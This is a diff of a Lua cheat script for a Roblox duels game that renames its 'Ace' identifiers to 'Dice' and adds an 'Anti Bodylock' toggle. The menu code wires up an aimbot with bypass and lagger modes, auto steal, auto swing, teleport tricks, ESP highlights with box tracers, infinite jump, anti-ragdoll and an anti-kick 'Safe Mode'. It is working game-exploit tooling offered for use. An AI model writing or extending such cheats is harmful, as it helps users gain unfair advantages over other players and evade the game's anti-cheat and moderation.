+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 setInfJumpInternal(not infJumpEnabled)
 if setInfJumpVisual then setInfJumpVisual(infJumpEnabled == true) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
 _, setAntiRagdollVisual = toggleRow(Movement, "Anti Ragdoll", antiRagdollEnabled, 17)
 do
 local row = Movement:FindFirstChild("Anti Ragdoll")
-_aceBtn = row and row:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 setAntiRagdoll(not antiRagdollEnabled)
 if setAntiRagdollVisual then setAntiRagdollVisual(antiRagdollEnabled == true) end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
-animationPackRow(Movement, 15)
+section(Movement, "BODY LOCK", 18)
+do
+_, setAntiBodylockVisual = toggleRow(Movement, "Anti Bodylock", _G.DiceAntiBodylockEnabled == true, 19)
+local row = Movement:FindFirstChild("Anti Bodylock")
+_diceBtn = row and row:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
+if _G.DiceAntiBodylockEnabled then
+disableAntiBodylock()
+else
+enableAntiBodylock()
+end
+if setAntiBodylockVisual then setAntiBodylockVisual(_G.DiceAntiBodylockEnabled == true) end
+saveDiceConfig()
+end)
+end
+if _G.DiceAntiBodylockEnabled then
+enableAntiBodylock()
+end
+end
+animationPackRow(Movement, 20)
 refreshSpeedModeRows()
 task.wait()
 Combat = pages.COMBAT
 section(Combat, "AUTO STEAL", 1)
 autoStealSelectorRow(Combat, 2)
-_aceRow, setAutoStealVisual = toggleRow(Combat, "Auto Steal", autoStealEnabled, 3)
+_diceRow, setAutoStealVisual = toggleRow(Combat, "Auto Steal", autoStealEnabled, 3)
 do
-_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = _diceRow and _diceRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 autoStealEnabled = not autoStealEnabled
 if setAutoStealVisual then
 setAutoStealVisual(autoStealEnabled)
 end
-if _G.AceAutoStealSync then _G.AceAutoStealSync() end
-saveAceConfig()
+if _G.DiceAutoStealSync then _G.DiceAutoStealSync() end
+saveDiceConfig()
 end)
 end
 end
@@ -5264,159 +6156,159 @@ local v = tonumber(radiusBox.Text)
 if v and v > 0 and v <= 500 then
 autoStealRadius = v
 end
-_G.AceStealRadii = _G.AceStealRadii or {Normal = 62, Semi = 9}
-_G.AceStealRadii[selectedStealMode] = autoStealRadius
+_G.DiceStealRadii = _G.DiceStealRadii or {Normal = 62, Semi = 9}
+_G.DiceStealRadii[selectedStealMode] = autoStealRadius
 radiusBox.Text = tostring(autoStealRadius)
-if _G.AceNormalAutoStealSetRadius then _G.AceNormalAutoStealSetRadius(_G.AceStealRadii.Normal or 62) end
-if _G.AceSemiAutoStealSetRadius then _G.AceSemiAutoStealSetRadius(_G.AceStealRadii.Semi or 9) end
-if _G.AceAutoStealSync then _G.AceAutoStealSync() end
-saveAceConfig()
+if _G.DiceNormalAutoStealSetRadius then _G.DiceNormalAutoStealSetRadius(_G.DiceStealRadii.Normal or 62) end
+if _G.DiceSemiAutoStealSetRadius then _G.DiceSemiAutoStealSetRadius(_G.DiceStealRadii.Semi or 9) end
+if _G.DiceAutoStealSync then _G.DiceAutoStealSync() end
+saveDiceConfig()
 end)
 section(Combat, "NORMAL/BYPASS AIMBOT", 5)
-_G.AceAimbotSelectorRow(Combat, 6)
-_G.AceAimbotSetVisual = nil
-if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
-_G.AceNormalAutoSwingRow, _G.AceNormalAutoSwingSetVisual, _G.AceNormalAutoSwingBtn = _G.AceActionToggleRow(Combat, "Auto Swing", autoSwingEnabled, 7)
+_G.DiceAimbotSelectorRow(Combat, 6)
+_G.DiceAimbotSetVisual = nil
+if _G.DiceRefreshAimbotVisual then _G.DiceRefreshAimbotVisual() end
+_G.DiceNormalAutoSwingRow, _G.DiceNormalAutoSwingSetVisual, _G.DiceNormalAutoSwingBtn = _G.DiceActionToggleRow(Combat, "Auto Swing", autoSwingEnabled, 7)
 do
-if _G.AceNormalAutoSwingBtn then
-_G.AceNormalAutoSwingBtn.MouseButton1Click:Connect(function()
-if _G.AceAutoSwingClickBusy then return end
-_G.AceAutoSwingClickBusy = true
+if _G.DiceNormalAutoSwingBtn then
+_G.DiceNormalAutoSwingBtn.MouseButton1Click:Connect(function()
+if _G.DiceAutoSwingClickBusy then return end
+_G.DiceAutoSwingClickBusy = true
 autoSwingEnabled = not autoSwingEnabled
-if _G.AceNormalAutoSwingSetVisual then _G.AceNormalAutoSwingSetVisual(autoSwingEnabled) end
-saveAceConfig()
-task.delay(0.12, function() _G.AceAutoSwingClickBusy = false end)
+if _G.DiceNormalAutoSwingSetVisual then _G.DiceNormalAutoSwingSetVisual(autoSwingEnabled) end
+saveDiceConfig()
+task.delay(0.12, function() _G.DiceAutoSwingClickBusy = false end)
 end)
 end
 end
-_G.AceMirrorTPDownRow, _G.AceMirrorTPDownSetVisual, _G.AceMirrorTPDownBtn = _G.AceActionToggleRow(Combat, "Mirror TP Down (Recommended)", mirrorTPDownEnabled, 7.1)
-local mirrorTPDownLabel = _G.AceMirrorTPDownRow and _G.AceMirrorTPDownRow:FindFirstChild("Label")
+_G.DiceMirrorTPDownRow, _G.DiceMirrorTPDownSetVisual, _G.DiceMirrorTPDownBtn = _G.DiceActionToggleRow(Combat, "Mirror TP Down (Recommended)", mirrorTPDownEnabled, 7.1)
+local mirrorTPDownLabel = _G.DiceMirrorTPDownRow and _G.DiceMirrorTPDownRow:FindFirstChild("Label")
 if mirrorTPDownLabel then mirrorTPDownLabel.TextSize = 10 end
-if _G.AceMirrorTPDownBtn then
-_G.AceMirrorTPDownBtn.MouseButton1Click:Connect(function()
-if _G.AceMirrorTPDownClickBusy then return end
-_G.AceMirrorTPDownClickBusy = true
-_G.AceSetMirrorTPDown(not mirrorTPDownEnabled)
-saveAceConfig()
-task.delay(0.12, function() _G.AceMirrorTPDownClickBusy = false end)
+if _G.DiceMirrorTPDownBtn then
+_G.DiceMirrorTPDownBtn.MouseButton1Click:Connect(function()
+if _G.DiceMirrorTPDownClickBusy then return end
+_G.DiceMirrorTPDownClickBusy = true
+_G.DiceSetMirrorTPDown(not mirrorTPDownEnabled)
+saveDiceConfig()
+task.delay(0.12, function() _G.DiceMirrorTPDownClickBusy = false end)
 end)
 end
 aimbotSpeedRow, aimbotSpeedBox = textboxRow(Combat, "Normal Aimbot Speed", tostring(AIMBOT_SPEED), 8)
-_G.AceAimbotSpeedBox = aimbotSpeedBox
+_G.DiceAimbotSpeedBox = aimbotSpeedBox
 aimbotSpeedLabel = aimbotSpeedRow and aimbotSpeedRow:FindFirstChild("Label")
 refreshAimbotModeLabels()
 aimbotSpeedBox.FocusLost:Connect(function()
 local v = tonumber(aimbotSpeedBox.Text)
 if v and v > 0 and v <= 250 then
-_G.AceSetSelectedAimbotSpeedValues(v, nil)
+_G.DiceSetSelectedAimbotSpeedValues(v, nil)
 end
-if _G.AceRefreshAimbotSpeedBoxes then _G.AceRefreshAimbotSpeedBoxes() else aimbotSpeedBox.Text = tostring(AIMBOT_SPEED) end
-saveAceConfig()
+if _G.DiceRefreshAimbotSpeedBoxes then _G.DiceRefreshAimbotSpeedBoxes() else aimbotSpeedBox.Text = tostring(AIMBOT_SPEED) end
+saveDiceConfig()
 end)
 laggerAimbotSpeedRow, laggerAimbotSpeedBox = textboxRow(Combat, "Normal Lagger Aimbot Speed", tostring(LAGGER_AIMBOT_SPEED), 9)
-_G.AceLaggerAimbotSpeedBox = laggerAimbotSpeedBox
+_G.DiceLaggerAimbotSpeedBox = laggerAimbotSpeedBox
 laggerAimbotSpeedLabel = laggerAimbotSpeedRow and laggerAimbotSpeedRow:FindFirstChild("Label")
 refreshAimbotModeLabels()
-if _G.AceRefreshAimbotSpeedBoxes then _G.AceRefreshAimbotSpeedBoxes() end
+if _G.DiceRefreshAimbotSpeedBoxes then _G.DiceRefreshAimbotSpeedBoxes() end
 laggerAimbotSpeedBox.FocusLost:Connect(function()
 local v = tonumber(laggerAimbotSpeedBox.Text)
 if v and v > 0 and v <= 250 then
-_G.AceSetSelectedAimbotSpeedValues(nil, v)
+_G.DiceSetSelectedAimbotSpeedValues(nil, v)
 end
-if _G.AceRefreshAimbotSpeedBoxes then _G.AceRefreshAimbotSpeedBoxes() else laggerAimbotSpeedBox.Text = tostring(LAGGER_AIMBOT_SPEED) end
-saveAceConfig()
+if _G.DiceRefreshAimbotSpeedBoxes then _G.DiceRefreshAimbotSpeedBoxes() else laggerAimbotSpeedBox.Text = tostring(LAGGER_AIMBOT_SPEED) end
+saveDiceConfig()
 end)
 section(Combat, "ANTI DESYNC BAT", 10)
-_G.AceAntiDesyncAutoSwingRow, _G.AceAntiDesyncAutoSwingSetVisual, _G.AceAntiDesyncAutoSwingBtn = _G.AceActionToggleRow(Combat, "Auto Swing", antiDesyncAutoSwingEnabled, 11)
+_G.DiceAntiDesyncAutoSwingRow, _G.DiceAntiDesyncAutoSwingSetVisual, _G.DiceAntiDesyncAutoSwingBtn = _G.DiceActionToggleRow(Combat, "Auto Swing", antiDesyncAutoSwingEnabled, 11)
 do
-if _G.AceAntiDesyncAutoSwingBtn then
-_G.AceAntiDesyncAutoSwingBtn.MouseButton1Click:Connect(function()
-if _G.AceAntiDesyncAutoSwingClickBusy then return end
-_G.AceAntiDesyncAutoSwingClickBusy = true
+if _G.DiceAntiDesyncAutoSwingBtn then
+_G.DiceAntiDesyncAutoSwingBtn.MouseButton1Click:Connect(function()
+if _G.DiceAntiDesyncAutoSwingClickBusy then return end
+_G.DiceAntiDesyncAutoSwingClickBusy = true
 antiDesyncAutoSwingEnabled = not antiDesyncAutoSwingEnabled
-if _G.AceAntiDesyncAutoSwingSetVisual then _G.AceAntiDesyncAutoSwingSetVisual(antiDesyncAutoSwingEnabled) end
-saveAceConfig()
-task.delay(0.12, function() _G.AceAntiDesyncAutoSwingClickBusy = false end)
+if _G.DiceAntiDesyncAutoSwingSetVisual then _G.DiceAntiDesyncAutoSwingSetVisual(antiDesyncAutoSwingEnabled) end
+saveDiceConfig()
+task.delay(0.12, function() _G.DiceAntiDesyncAutoSwingClickBusy = false end)
 end)
 end
 end
-_G.AceAntiDesyncSetVisual = function(_) end
+_G.DiceAntiDesyncSetVisual = function(_) end
 section(Combat, "COUNTERS", 13)
-_aceRow, setBatCounterVisual = _G.AceActionToggleRow(Combat, "Bat Counter", batCounterEnabled, 14)
+_diceRow, setBatCounterVisual = _G.DiceActionToggleRow(Combat, "Bat Counter", batCounterEnabled, 14)
 do
-_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = _diceRow and _diceRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 batCounterEnabled = not batCounterEnabled
 if setBatCounterVisual then
 setBatCounterVisual(batCounterEnabled)
 end
 if batCounterEnabled then
-if _G.AceStartBatCounter then _G.AceStartBatCounter() end
+if _G.DiceStartBatCounter then _G.DiceStartBatCounter() end
 else
-if _G.AceStopBatCounter then _G.AceStopBatCounter() end
+if _G.DiceStopBatCounter then _G.DiceStopBatCounter() end
 end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
-_aceRow, setMedCounterVisual = _G.AceActionToggleRow(Combat, "Med Counter", medCounterEnabled, 15)
+_diceRow, setMedCounterVisual = _G.DiceActionToggleRow(Combat, "Med Counter", medCounterEnabled, 15)
 do
-_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = _diceRow and _diceRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 medCounterEnabled = not medCounterEnabled
 if setMedCounterVisual then
 setMedCounterVisual(medCounterEnabled)
 end
 if medCounterEnabled then
-if _G.AceStartMedCounter then _G.AceStartMedCounter(LP.Character) end
+if _G.DiceStartMedCounter then _G.DiceStartMedCounter(LP.Character) end
 else
-if _G.AceStopMedCounter then _G.AceStopMedCounter() end
+if _G.DiceStopMedCounter then _G.DiceStopMedCounter() end
 end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
-_aceRow, _G.AceSetNoPlayerCollisionVisual = _G.AceActionToggleRow(Combat, "No Player Collision", _G.AceNoPlayerCollisionEnabled, 16)
+_diceRow, _G.DiceSetNoPlayerCollisionVisual = _G.DiceActionToggleRow(Combat, "No Player Collision", _G.DiceNoPlayerCollisionEnabled, 16)
 do
-_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
-_G.AceNoPlayerCollisionEnabled = not _G.AceNoPlayerCollisionEnabled
-if _G.AceSetNoPlayerCollisionVisual then _G.AceSetNoPlayerCollisionVisual(_G.AceNoPlayerCollisionEnabled) end
-if _G.AceNoPlayerCollisionEnabled then
+_diceBtn = _diceRow and _diceRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
+_G.DiceNoPlayerCollisionEnabled = not _G.DiceNoPlayerCollisionEnabled
+if _G.DiceSetNoPlayerCollisionVisual then _G.DiceSetNoPlayerCollisionVisual(_G.DiceNoPlayerCollisionEnabled) end
+if _G.DiceNoPlayerCollisionEnabled then
 if enableNoPlayerCollision then enableNoPlayerCollision() end
 else
 if disableNoPlayerCollision then disableNoPlayerCollision() end
 end
-saveAceConfig()
+saveDiceConfig()
 end)
 end
 end
-_aceRow, setSafeModeVisual = _G.AceActionToggleRow(Combat, "Safe Mode", antiKickEnabled, 17)
+_diceRow, setSafeModeVisual = _G.DiceActionToggleRow(Combat, "Safe Mode", antiKickEnabled, 17)
 do
-_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
+_diceBtn = _diceRow and _diceRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
 antiKickEnabled = not antiKickEnabled
 if setSafeModeVisual then setSafeModeVisual(antiKickEnabled) end
-if antiKickEnabled and _G.AceSafeModeForceStop then _G.AceSafeModeForceStop("SAFE MODE") end
-saveAceConfig()
+if antiKickEnabled and _G.DiceSafeModeForceStop then _G.DiceSafeModeForceStop("SAFE MODE") end
+saveDiceConfig()
 end)
 end
 end
-_aceRow, setAutoResetOnMedVisual = toggleRow(Combat, "Auto Reset On Med Fling", autoResetOnMedEnabled, 18)
+_diceRow, setAutoResetOnMedVisual = toggleRow(Combat, "Auto Reset On Med Fling", autoResetOnMedEnabled, 18)
 do
-_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
-if _aceBtn then
-_aceBtn.Activated:Connect(function()
-if _G.AceSetAutoResetOnMed then
-_G.AceSetAutoResetOnMed(not autoResetOnMedEnabled)
+_diceBtn = _diceRow and _diceRow:FindFirstChild("ToggleButton")
+if _diceBtn then
+_diceBtn.Activated:Connect(function()
+if _G.DiceSetAutoResetOnMed then
+_G.DiceSetAutoResetOnMed(not autoResetOnMedEnabled)
 else
 autoResetOnMedEnabled = not autoResetOnMedEnabled
 if setAutoResetOnMedVisual then setAutoResetOnMedVisual(autoResetOnMedEnabled) end
-saveAceConfig()
+saveDiceConfig()
 end
 end)
 end
@@ -5432,7 +6324,7 @@ section(Keybinds, "COMBAT KEYBINDS", 6)
 aimbotKeybindRow = speedKeybindRow(Keybinds, "Normal Aimbot", "Aimbot", 7)
 combatAimbotKeybindLabel = aimbotKeybindRow and aimbotKeybindRow:FindFirstChild("Label")
 refreshAimbotModeLabels()
-speedKeybindRow(Keybinds, "TP Bat", "AntiDesyncAimbot", 8)
+speedKeybindRow(Keybinds, "Anti Desync Bat", "AntiDesyncAimbot", 8)
 speedKeybindRow(Keybinds, "Auto Left", "AutoLeft", 9)
 speedKeybindRow(Keybinds, "Auto Right", "AutoRight", 10)
 speedKeybindRow(Keybinds, "Instant Reset", "InstantReset", 12)
@@ -5447,11 +6339,11 @@ stretchRezConn = stretchRezConn or nil
 antiLagDescConn = antiLagDescConn or nil
 noCamCollisionConn = noCamCollisionConn or nil
 noCamCollisionParts = noCamCollisionParts or {}
-_aceNukeConns = _aceNukeConns or {}
-_aceNukeOn = _aceNukeOn or false
-_aceCustomFontOrig = _aceCustomFontOrig or {}
-_aceCustomFontConn = _aceCustomFontConn or nil
-_aceCustomFont = _aceCustomFont or nil
+_diceNukeConns = _diceNukeConns or {}
+_diceNukeOn = _diceNukeOn or false
+_diceCustomFontOrig = _diceCustomFontOrig or {}
+_diceCustomFontConn = _diceCustomFontConn or nil
+_diceCustomFont = _diceCustomFont or nil
 function startPlayerESP()
 if PlayerESP.enabled then return end
 PlayerESP.enabled = true
@@ -5469,10 +6361,10 @@ local hrp=char and (char:FindFirstChild("HumanoidRootPart") or char:WaitForChild
 local head=char and (char:FindFirstChild("Head") or char:WaitForChild("Head",5))
 if not hrp or not head then return end
 local hl=Instance.new("Highlight")
-hl.Name="AceDuelsESP"; hl.Adornee=char; hl.FillColor=Color3.fromRGB(35,35,35); hl.FillTransparency=0.72
+hl.Name="DiceDuelsESP"; hl.Adornee=char; hl.FillColor=Color3.fromRGB(35,35,35); hl.FillTransparency=0.72
 hl.OutlineColor=Color3.fromRGB(245,245,245); hl.OutlineTransparency=0; hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop; hl.Parent=char
 local bb=Instance.new("BillboardGui")
-bb.Name="AceDuelsESPTag"; bb.Adornee=head; bb.Size=UDim2.new(0,124,0,34); bb.StudsOffset=Vector3.new(0,2.7,0); bb.AlwaysOnTop=true; bb.LightInfluence=0; bb.Parent=head
+bb.Name="DiceDuelsESPTag"; bb.Adornee=head; bb.Size=UDim2.new(0,124,0,34); bb.StudsOffset=Vector3.new(0,2.7,0); bb.AlwaysOnTop=true; bb.LightInfluence=0; bb.Parent=head
 local box=Instance.new("Frame",bb); box.Size=UDim2.new(1,0,1,0); box.BackgroundTransparency=1; box.BorderSizePixel=0
 Instance.new("UICorner",box).CornerRadius=UDim.new(0,9)
 local n=Instance.new("TextLabel",box); n.Size=UDim2.new(1,-10,0,17); n.Position=UDim2.new(0,5,0,2); n.BackgroundTransparency=1; n.TextColor3=Color3.fromRGB(255,255,255); n.Font=Enum.Font.GothamBlack; n.TextSize=15; n.TextStrokeTransparency=0.38
@@ -5495,7 +6387,7 @@ PlayerESP.conns={}
 for plr,d in pairs(PlayerESP.playerData or {}) do pcall(function() if d.highlight then d.highlight:Destroy() end end); pcall(function() if d.billboard then d.billboard:Destroy() end end) end
 PlayerESP.playerData={}
 end
-function _aceEspColor()
+function _diceEspColor()
 return THEME_ACCENT or Color3.fromRGB(230,230,230)
 end
 function _safeDrawing(kind, props)
@@ -5541,12 +6433,12 @@ local headPos = cam:WorldToViewportPoint(head.Position + Vector3.new(0,0.55,0))
 local data = BoxedESPData[player]
 if not data then
 data = {
-box = _safeDrawing("Square",{Thickness=2,Filled=false,Transparency=1,Color=_aceEspColor()}),
-tracer = _safeDrawing("Line",{Thickness=2,Transparency=1,Color=_aceEspColor()}),
+box = _safeDrawing("Square",{Thickness=2,Filled=false,Transparency=1,Color=_diceEspColor()}),
+tracer = _safeDrawing("Line",{Thickness=2,Transparency=1,Color=_diceEspColor()}),
 }
 BoxedESPData[player] = data
 end
-local color = _aceEspColor()
+local color = _diceEspColor()
 local height = math.abs(headPos.Y - rootPos.Y) * 2.15
 if height < 20 or height ~= height then height = 65 end
 local width = height / 2.15
@@ -5620,18 +6512,18 @@ SKY_PRESETS_LIST={"Off","Night","Aurora","Sunset","Galaxy","Tech","Sakura","Pink
 SKY_PRESETS={Off={kind="off"},Night={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140}},Aurora={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150}},Sunset={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110}},Galaxy={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110}},Tech={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180}},Sakura={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170}},["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120}},["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50}},["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150}},Volcanic={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50}},Arctic={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245}},["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140}},Vaporwave={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210}},Toxic={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90}},["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70}},Hellscape={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40}},Heaven={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220}},Storm={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120}},Sunrise={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140}},["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60}},["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230}},Inferno={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50}},["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220}}}
 function _vC3(t) return Color3.fromRGB(t[1],t[2],t[3]) end
 function _v4mpClearSky()
-for _,v in ipairs(Lighting:GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end
-local terrain=workspace:FindFirstChildOfClass("Terrain"); if terrain then for _,v in ipairs(terrain:GetChildren()) do if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end end end
+for _,v in ipairs(Lighting:GetChildren()) do if v:GetAttribute("_DiceDuelsSky") then pcall(function() v:Destroy() end) end end
+local terrain=workspace:FindFirstChildOfClass("Terrain"); if terrain then for _,v in ipairs(terrain:GetChildren()) do if v:GetAttribute("_DiceDuelsSky") then pcall(function() v:Destroy() end) end end end
 end
 function applyCustomSky(mode)
 _v4mpClearSky(); local p=SKY_PRESETS[mode]
 if not p or p.kind=="off" then Lighting.Brightness=2; Lighting.ClockTime=14; Lighting.GlobalShadows=true; skyTheme="Off"; return end
 Lighting.ClockTime=p.clock or 14; Lighting.Brightness=p.brightness or 2; if p.ambient then Lighting.Ambient=_vC3(p.ambient) end; if p.outAmb then Lighting.OutdoorAmbient=_vC3(p.outAmb) end
-local atm=Instance.new("Atmosphere"); atm:SetAttribute("_AceDuelsSky",true); atm.Density=0.35; atm.Color=Lighting.Ambient; atm.Decay=Lighting.OutdoorAmbient; atm.Parent=Lighting
-local sky=Instance.new("Sky"); sky:SetAttribute("_AceDuelsSky",true); sky.StarCount=(mode=="Galaxy" or mode=="Deep Space") and 10000 or 2000; sky.Parent=Lighting
+local atm=Instance.new("Atmosphere"); atm:SetAttribute("_DiceDuelsSky",true); atm.Density=0.35; atm.Color=Lighting.Ambient; atm.Decay=Lighting.OutdoorAmbient; atm.Parent=Lighting
+local sky=Instance.new("Sky"); sky:SetAttribute("_DiceDuelsSky",true); sky.StarCount=(mode=="Galaxy" or mode=="Deep Space") and 10000 or 2000; sky.Parent=Lighting
 skyTheme=mode
 end
-_G.AceStretchFOV = _G.AceStretchFOV or 120
+_G.DiceStretchFOV = _G.DiceStretchFOV or 120
 function enableStretchRez()
 fpsBoostEnabled=true
 local cam=workspace.CurrentCamera
@@ -5641,7 +6533,7 @@ stretchRezConn=RunService.RenderStepped:Connect(function()
 if not fpsBoostEnabled then if stretchRezConn then stretchRezConn:Disconnect(); stretchRezConn=nil end; return end
 cam=workspace.CurrentCamera
 if cam then
-if not fovEnabled then pcall(function() cam.FieldOfView=_G.AceStretchFOV end) end
+if not fovEnabled then pcall(function() cam.FieldOfView=_G.DiceStretchFOV end) end
 end
 end)
 end
@@ -5668,12 +6560,12 @@ end
 function enableAntiLag() antiLagVisualEnabled=true; applyKTMOptimization() end
 function disableAntiLag() antiLagVisualEnabled=false; if antiLagDescConn and not nukeOptimiserEnabled then antiLagDescConn:Disconnect(); antiLagDescConn=nil end end
 function enableNukeOptimizer()
-nukeOptimiserEnabled=true; _aceNukeOn=true; applyKTMOptimization(); applyCustomSky("Off")
-for _,c in ipairs(_aceNukeConns) do pcall(function() c:Disconnect() end) end; _aceNukeConns={}
-table.insert(_aceNukeConns, workspace.DescendantAdded:Connect(function(o) if nukeOptimiserEnabled then _applyAntiLagObj(o) end end))
+nukeOptimiserEnabled=true; _diceNukeOn=true; applyKTMOptimization(); applyCustomSky("Off")
+for _,c in ipairs(_diceNukeConns) do pcall(function() c:Disconnect() end) end; _diceNukeConns={}
+table.insert(_diceNukeConns, workspace.DescendantAdded:Connect(function(o) if nukeOptimiserEnabled then _applyAntiLagObj(o) end end))
 task.spawn(function() while nukeOptimiserEnabled do pcall(function() setfpscap(240) end); task.wait(3) end end)
 end
-function disableNukeOptimizer() nukeOptimiserEnabled=false; _aceNukeOn=false; for _,c in ipairs(_aceNukeConns) do pcall(function() c:Disconnect() end) end; _aceNukeConns={} end
+function disableNukeOptimizer() nukeOptimiserEnabled=false; _diceNukeOn=false; for _,c in ipairs(_diceNukeConns) do pcall(function() c:Disconnect() end) end; _diceNukeConns={} end
 function enableNoCamCollision()
 noCamCollisionEnabled=true; if noCamCollisionConn then noCamCollisionConn:Disconnect() end
 noCamCollisionConn=RunService.RenderStepped:Connect(function()
@@ -5780,12 +6672,12 @@ SKY_PRESETS = {
 function _vC3(t) return Color3.fromRGB(t[1], t[2], t[3]) end
 function _v4mpClearSky()
 for _, v in ipairs(Lighting:GetChildren()) do
-if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end
+if v:GetAttribute("_DiceDuelsSky") then pcall(function() v:Destroy() end) end
 end
 local terrain = workspace:FindFirstChildOfClass("Terrain")
 if terrain then
 for _, v in ipairs(terrain:GetChildren()) do
-if v:GetAttribute("_AceDuelsSky") then pcall(function() v:Destroy() end) end
+if v:GetAttribute("_DiceDuelsSky") then pcall(function() v:Destroy() end) end
 end
 end
 end
@@ -5808,7 +6700,7 @@ if preset.outAmb then Lighting.OutdoorAmbient = _vC3(preset.outAmb) end
 if preset.ambient then Lighting.Ambient = _vC3(preset.ambient) end
 if preset.sky then
 local sky = Instance.new("Sky")
-sky:SetAttribute("_AceDuelsSky", true)
+sky:SetAttribute("_DiceDuelsSky", true)
 if preset.sky.stars then sky.StarCount = preset.sky.stars end
 if preset.sky.moon then sky.MoonAngularSize = preset.sky.moon end
 if preset.sky.sun then sky.SunAngularSize = preset.sky.sun end
@@ -5817,7 +6709,7 @@ sky.Parent = Lighting
 end
 if preset.atm then
 local atm = Instance.new("Atmosphere")
-atm:SetAttribute("_AceDuelsSky", true)
+atm:SetAttribute("_DiceDuelsSky", true)
 atm.Density = preset.atm.dens or 0.3
 atm.Color = _vC3(preset.atm.color)
 atm.Decay = _vC3(preset.atm.decay)
@@ -5828,7 +6720,7 @@ end
 local terrain = workspace:FindFirstChildOfClass("Terrain")
 if preset.clouds and terrain then
 local clouds = Instance.new("Clouds")
-clouds:SetAttribute("_AceDuelsSky", true)
+clouds:SetAttribute("_DiceDuelsSky", true)
 clouds.Cover = preset.clouds.cover or 0.5
 clouds.Density = preset.clouds.dens or 0.5
 clouds.Color = _vC3(preset.clouds.color)
@@ -5978,7 +6870,7 @@ local sky = Instance.new("Sky")
 sky.SkyboxBk = ""; sky.SkyboxDn = ""; sky.SkyboxFt = ""
 sky.SkyboxLf = ""; sky.SkyboxRt = ""; sky.SkyboxUp = ""
 sky.CelestialBodiesShown = false
-sky.Name = "_AceDuelsNukeSky"
+sky.Name = "_DiceDuelsNukeSky"
 sky.Parent = Lighting
 end)
 end
@@ -6096,17 +6988,17 @@ _nukeOptimizerThreads = {}
 end
 function enableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
 function disableCustomFont() customFontVisualEnabled=false; if V then V.customFontEnabled=false end end
-__ace_src_enableNoCamCollision = enableNoCamCollision
+__dice_src_enableNoCamCollision = enableNoCamCollision
 function enableNoCamCollision()
-__ace_src_enableNoCamCollision()
+__dice_src_enableNoCamCollision()
 noCamCollisionEnabled = true
 end
-__ace_src_disableNoCamCollision = disableNoCamCollision
+__dice_src_disableNoCamCollision = disableNoCamCollision
 function disableNoCamCollision()
-__ace_src_disableNoCamCollision()
+__dice_src_disableNoCamCollision()
 noCamCollisionEnabled = false
 end
-function __AceDuelsSetupVisualsUI()
+function __DiceDuelsSetupVisualsUI()
 local Utility = pages.VISUALS
 local skyThemes = SKY_PRESETS_LIST or {"Off", "Night", "Aurora", "Sunset", "Galaxy", "Tech", "Sakura"}
 local skyIndex = 1
@@ -6117,12 +7009,12 @@ row.Size = UDim2.new(1, -4, 0, 42)
 row.ClipsDescendants = true
 local label = row:FindFirstChild("Label")
 if label then
-label.Size = UDim2.new(0, 92, 1, 0)
+label.Size = UDim2.new(0, 84, 1, 0)
 label.TextSize = 11
 end
 local left = Instance.new("TextButton")
